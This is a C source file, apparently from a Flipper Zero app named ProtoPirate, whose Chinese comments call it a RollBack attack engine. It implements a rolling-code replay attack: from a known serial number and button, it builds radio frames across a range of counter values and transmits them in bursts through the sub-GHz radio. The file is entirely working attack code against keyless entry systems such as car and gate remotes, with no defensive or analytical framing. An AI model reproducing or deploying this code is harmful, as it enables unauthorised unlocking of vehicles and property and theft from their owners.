#include "protopirate_rb.h"

// ===================== RollBack 攻击引擎 =====================
// 基于已知序列号+按钮，枚举计数器进行重放攻击
//
// 注意: rollback_build_frame 已在 protopirate_rb.c 中定义
// 这里只保留 rollback_attack_run (旧版阻塞式，向后兼容)
//
// 新版使用 protopirate_rb.c 中的非阻塞 scene_rollback_alloc

bool rollback_send_single(
    ProtoPirateApp* app,
    uint32_t serial,
    uint8_t button,
    uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame(serial, button, counter, &data_hi, &data_lo);
    return transmit_packet(
        app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;

    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;

    int16_t direction = (end > start) ? 1 : -1;
    uint32_t total_steps = abs((int32_t)end - (int32_t)start) / step + 1;
    uint32_t current_step = 0;

    FURI_LOG_I(
        TAG, "RollBack START: cnt 0x%04X -> 0x%04X, step=%u, total=%lu",
        start, end, step, total_steps);

    // Initialize TX hardware for the attack
    if(!tx_init_hw(app, app->frequency)) {
        rs->running = false;
        return false;
    }

    transmit_start(app, app->frequency);

    // Emit counter values from start to end
    for(uint16_t cnt = start;; cnt += direction * step) {
        uint32_t data_hi, data_lo;
        rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);


        transmit_burst(app, data_hi, data_lo);
        furi_delay_ms(30);

        rs->current_counter = cnt;
        current_step++;

        // Check termination
        if((direction > 0 && cnt >= end) ||
           (direction < 0 && cnt <= end)) {
            break;
        }
        if(current_step > 65536) break; // Safety limit
    }

    transmit_stop(app);
    rs->running = false;

    FURI_LOG_I(TAG, "RollBack DONE: %lu frames sent", current_step);
    return true;
}
